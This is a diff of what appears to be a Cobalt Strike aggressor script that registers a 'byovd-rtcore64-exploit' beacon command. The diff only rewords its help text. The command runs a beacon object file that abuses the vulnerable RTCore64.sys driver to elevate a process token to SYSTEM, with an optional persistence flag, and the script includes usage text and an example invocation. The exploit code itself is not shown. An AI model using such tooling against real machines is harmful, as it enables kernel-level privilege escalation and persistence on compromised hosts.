@@ -1,8 +1,8 @@
 # author @mooolight
 
 beacon_command_register(
-	"byovd-rtcore64-exploit", "Capabilities not limited to elevating the target process' token similar to SYSTEM.exe through modification of kernel memory with the help of the RTCore64.sys vulnerable driver.",
-	"INFO:\nCapabilities not limited to elevating the target process' token similar to SYSTEM.exe through modification of kernel memory with the help of the RTCore64.sys vulnerable driver.\n\n" .
+	"byovd-rtcore64-exploit", "Capabilities not limited to elevating the target process' token similar to SYSTEM.exe through modification of kernel memory by exploiting the RTCore64.sys vulnerable driver.",
+	"INFO:\nCapabilities not limited to elevating the target process' token similar to SYSTEM.exe through modification of kernel memory by exploiting the RTCore64.sys vulnerable driver.\n\n" .
 	"ARGUMENTS:\n[<action>]: Action to take after the exploitation phase.\n[<targetProc>]: Target process for the action parameter.\n[<pers>]: Status whether the exploited service will persist or not.\n\n" .
 	"USAGE:\nbyovd-rtcore64-exploit <action> <targetProc>\n\n".
 	"EXAMPLES:\nbyovd-rtcore64-exploit elevate2system 8917 TRUE\n\n");
@@ -34,6 +34,6 @@ alias byovd-rtcore64-exploit {
     # Pack our arguments
     $arg_data  = bof_pack($bid, "zzz", $action, $targetProc,$pers);
 
-    blog($bid, "Capabilities not limited to elevating the target process' token similar to SYSTEM.exe through modification of kernel memory with the help of the RTCore64.sys vulnerable driver.");
+    blog($bid, "Capabilities not limited to elevating the target process' token similar to SYSTEM.exe through modification of kernel memory by exploiting the RTCore64.sys vulnerable driver.");
     beacon_inline_execute($bid, $data, "go", $arg_data);
 }
